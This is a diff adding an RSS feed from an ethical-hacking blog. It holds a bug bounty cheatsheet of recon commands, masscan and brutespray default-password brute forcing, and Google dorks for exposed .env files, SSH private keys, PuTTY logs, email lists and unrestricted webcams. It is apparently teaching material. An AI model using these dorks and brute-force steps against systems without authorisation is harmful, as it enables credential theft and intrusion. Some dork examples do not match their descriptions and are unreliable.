@@ -1,0 +1,993 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Ethical Hacking on Orangeymango</title>
+        <link>https://orangeymango.me/tags/ethical-hacking/</link>
+        <description>Recent content in Ethical Hacking on Orangeymango</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language><atom:link href="https://orangeymango.me/tags/ethical-hacking/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Bug Bounty Essentials - A Comprehensive Cheatsheet</title>
+        <link>https://orangeymango.me/p/bug-bounty-essentials-a-comprehensive-cheatsheet/</link>
+        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+        
+        <guid>https://orangeymango.me/p/bug-bounty-essentials-a-comprehensive-cheatsheet/</guid>
+        <description>&lt;img src="https://miro.medium.com/v2/resize:fit:1400/1*wBuE9-f32uHnqH9Sq4EFiQ.png" alt="Featured image of post Bug Bounty Essentials - A Comprehensive Cheatsheet" /&gt;&lt;h1 id=&#34;recon-workflow&#34;&gt;Recon Workflow
+&lt;/h1&gt;&lt;h2 id=&#34;1-initial-reconnaissance&#34;&gt;1. Initial Reconnaissance
+&lt;/h2&gt;&lt;h3 id=&#34;11-finding-subdomains&#34;&gt;1.1 Finding Subdomains
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Linked &amp;amp; JS Discovery with Burp Suite Pro&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Turn off passive scanning&lt;/li&gt;
+&lt;li&gt;Set forms to auto-submit&lt;/li&gt;
+&lt;li&gt;Configure scope and keywords&lt;/li&gt;
+&lt;li&gt;Browse the main site&lt;/li&gt;
+&lt;li&gt;Spider all hosts&lt;/li&gt;
+&lt;li&gt;Go to Target → Scope → Advanced Scope Control → Add host or IP range&lt;/li&gt;
+&lt;li&gt;Show only scope items&lt;/li&gt;
+&lt;li&gt;Select all hosts → Engagement Tools → Analyze Target → Save report as HTML file&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Other Tools for Subdomain Discovery&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Gospider&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;hakrawler&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Subdomainizer&lt;/code&gt;:
+&lt;ul&gt;
+&lt;li&gt;Find subdomains referenced in JS files&lt;/li&gt;
+&lt;li&gt;Identify cloud services referenced in JS files&lt;/li&gt;
+&lt;li&gt;Use Shannon Entropy formula to find potentially sensitive items in JS files&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;subscraper&lt;/code&gt;: If only looking for subdomains&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Scraping with Amass&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;amass -d example.com&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Scraping with Subfinder v2&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;subfinder -d example.com -v&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Scraping with &lt;a class=&#34;link&#34; href=&#34;http://github-subdomains.py/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Github-subdomains.py&lt;/a&gt;&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;python3 github-subdomains.py -t &amp;quot;githubpersonalaccounttoken&amp;quot; -d example.com &amp;gt; example.com&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Scraping with Cloud Ranges&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Technique to monitor AWS, GCP, Azure for SSL&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;12-subdomain-brute-forcing&#34;&gt;1.2 Subdomain Brute Forcing
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;With Amass&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Guessing for live subdomains with a large list of common subdomain names&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;amass enum -brute -d example.com -src&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;amass enum -brute -d example.com -rf resolvers.txt -w bruteforce.list&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;With shuffleDNS&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;shuffledns -d example.com -w words.txt -r resolvers-excellent.txt&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Subdomain Brute Forcing Lists&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/tomnomnom&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Tomnomnom&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Assetnote/commonspeak2&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Assetnote Commonspeak2&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Alteration Scanning&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;altdns&lt;/code&gt;:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;dev1.example.com&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;dev2.example.com&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;dev-1.example.com&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;2-infrastructure-discovery&#34;&gt;2. Infrastructure Discovery
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Finding Infrastructure Sources&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Censys&lt;/li&gt;
+&lt;li&gt;Robtex&lt;/li&gt;
+&lt;li&gt;Wayback Machine&lt;/li&gt;
+&lt;li&gt;DNSdumpster&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://ptrarchive.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;PTRarchive.com&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Netcraft&lt;/li&gt;
+&lt;li&gt;DNSDB Search&lt;/li&gt;
+&lt;li&gt;PassiveTotal&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Certificate Sources&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://crt.sh/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;crt.sh&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Certspotter&lt;/li&gt;
+&lt;li&gt;CertDB&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Security Sources&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://hackertarget.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Hackertarget&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://securitytrails.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Security Trails&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.virustotal.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;VirusTotal&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;F-Secure&lt;/li&gt;
+&lt;li&gt;Riddler&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.threatcrowd.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;ThreatCrowd&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.threatminer.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;ThreatMiner&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;3-port-analysis--service-analysis&#34;&gt;3. Port Analysis &amp;amp; Service Analysis
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Port Analysis with Massscan&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;massscan -p1-65535 &amp;lt;ip&amp;gt; --max-rate 1800 -oG outputfile.txt&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Port Analysis with Dnmasscan&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;dnmasscan outputfile.txt dns.log -p80,443 -oG masscan.log&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Service Scanning with Brutespray&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Scan remote administration protocols for default passwords, which takes Nmap OG file format&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Massscan&lt;/code&gt; → &lt;code&gt;nmapservice scan -oG&lt;/code&gt; → &lt;code&gt;brutespray credential brute force&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;4-vulnerability-discovery&#34;&gt;4. Vulnerability Discovery
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Subdomain Takeover&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/haccer/subjack&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Can I Take Over XYZ GitHub Repo&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SubOver&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;nuclei&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Screenshotting&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;eyewitness&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;aquatone&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;httpscreenshot&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;5-google-dorking&#34;&gt;5. Google Dorking
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Scraping with Google&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;site:example.com -www.example.com&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;site:example.com -www.example.com -sub.example.com&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;site:example.com -www.example.com -sub.example.com -dev.example.com&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;6-automation-tools--frameworks&#34;&gt;6. Automation Tools &amp;amp; Frameworks
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Extending Tools&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/codingo/Interlace&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Interlace&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Recon Framework&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/tomnomnom/tools&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Tomnomnom Tools&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;C-tier Frameworks&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/AdmiralGaust/bountyRecon&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;AdmiralGaust/bountyRecon&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/offhoursscoding/recon&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;offhoursscoding/recon&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Sambal0x/recon-tools&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Sambal0x/recon-tools&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/JoshuaMart/Autorecon&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;JoshuaMart/Autorecon&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/yourbuddy25/Hunter&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;yourbuddy25/Hunter&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://gist.github.com/dwisiswant05f647e3d406b5e984e6d69d3538968cd&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;ultimate_recon.sh&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;B-tier Frameworks&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/capt-meelo/LazyRecon&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;capt-meelo/LazyRecon&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/phspade/Automated-Scanner&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;phspade/Automated-Scanner&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/shmilylty/OneForAll&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;shmilylty/OneForAll&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/SolomonSklash/chomp-scan&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;SolomonSklash/chomp-scan&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/TypeError/domained&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;TypeError/domained&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Screetsec/Sudomy&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Screetsec/Sudomy&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/devanshbatham/Gorecon&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;devanshbatham/Gorecon&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/LordNeoStark/tugarecon&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;LordNeoStark/tugarecon&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;A-tier Frameworks&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Edu4rdSHL/findomain&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Edu4rdSHL/findomain&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/SilverPoision/Rock-ON&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;SilverPoision/Rock-ON&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/epi052/recon-pipeline&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;epi052/recon-pipeline&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;S-tier Frameworks&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://intrigue.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Intrigue.io&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.assetnote.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;AssetNote&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.spiderfoot.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Spiderfoot&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://chaos.projectdiscovery.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Project Discovery Framework&lt;/a&gt; - Download subdomain files of all public programs in HackerOne &amp;amp; Bugcrowd, watch for new domains&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;7-mindmaps&#34;&gt;7. Mindmaps
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;XMind&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.xmind.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;XMind - Mind Mapping Software&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;google-dork-techniques&#34;&gt;Google Dork Techniques
+&lt;/h1&gt;&lt;h2 id=&#34;1-basic-search-operators&#34;&gt;1. Basic Search Operators
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;cache:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Shows the cached version of any website.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;cache:example.com&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;allintext:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Searches for specific text contained on any web page.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;allintext: hacking tools&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;allintitle:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Searches for pages with titles containing specific text.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;allintitle:&amp;quot;Security Companies&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;allinurl:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Fetches results whose URL contains all the specified characters.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;allinurl: client area&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;filetype:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Searches for specific file extensions.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;filetype: jpg filename:id_rsa&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;inurl:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Searches for URLs containing a specific keyword.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;inurl: admin&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;intitle:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Searches for keywords in the title of pages.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;intitle:secu&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;inanchor:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Searches for pages with exact anchor text used in links.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;inanchor:&amp;quot;cyber security&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;intext:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Locates pages containing certain strings inside their text.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;intext:&amp;quot;safe internet&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;link:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Shows pages linking to a specified URL.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;link: microsoft.com&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;site:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Shows a list of all indexed URLs for a specified domain or subdomain.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;site:securitytrails.com&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;wildcard (*)&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Used to search for pages that contain “anything” before your word.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;* a website&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;logical OR (|)&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Finds sites containing either one term or another.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;&amp;quot;security&amp;quot; &amp;quot;tips&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;plus (+)&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Concatenates words to detect pages using more than one specific key.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;security + trails&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;minus (-)&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Excludes pages containing certain words.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;security -trails&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;2-advanced-search-techniques&#34;&gt;2. Advanced Search Techniques
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Log Files&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Searches for results including usernames inside log files.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;allintext:username filetype:log&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Vulnerable Web Servers&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Detects vulnerable or hacked servers.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;inurl:/proc/self/cwd&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Open FTP Servers&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Finds public FTP servers which may reveal interesting information.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;intitle:&amp;quot;index of&amp;quot; inurl:ftp&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;ENV Files&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Searches for .env files used by web development frameworks.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;site:example.com/.env&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;SSH Private Keys&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Finds exposed SSH private keys.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;intitle:index.of id_rsa -id_rsa.pub&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Putty Logs&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Fetches SSH usernames from Putty logs.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;filetype:log username putty&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Email Lists&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Searches for Excel files containing email addresses.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;filetype:xls inurl:&amp;quot;email.xls&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;University Email Lists&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Filters for .edu domain names to find educational email lists.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;site:.edu filetype:xls inurl:&amp;quot;email.xls&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;3-media-and-camera-searches&#34;&gt;3. Media and Camera Searches
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Live Cameras&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Fetches live camera web pages not restricted by IP.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;inurl:top.htm inurl:currenttime&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;WebcamXP-Based Transmissions&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Finds webcamXP-based live streams.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;intitle:&amp;quot;webcamXP 5&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;General Live Cameras&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Finds general live camera feeds.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;inurl:&amp;quot;lvappl.htm&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;MP3 Files&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Searches for MP3 files available on the web.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;intitle: index of mp3&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;PDF Files&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Finds legal free PDF documents.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;intitle: index of pdf intext: .mp4&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Weather Devices&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Fetches transmissions from Weather Wing devices.&lt;/p&gt;
+&lt;p&gt;Example: &lt;code&gt;intitle:&amp;quot;Weather Wing WS-2&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;vulnerability-testing-and-approaches&#34;&gt;Vulnerability Testing and Approaches
+&lt;/h1&gt;&lt;h3 id=&#34;1-privilege-escalation&#34;&gt;1. Privilege Escalation
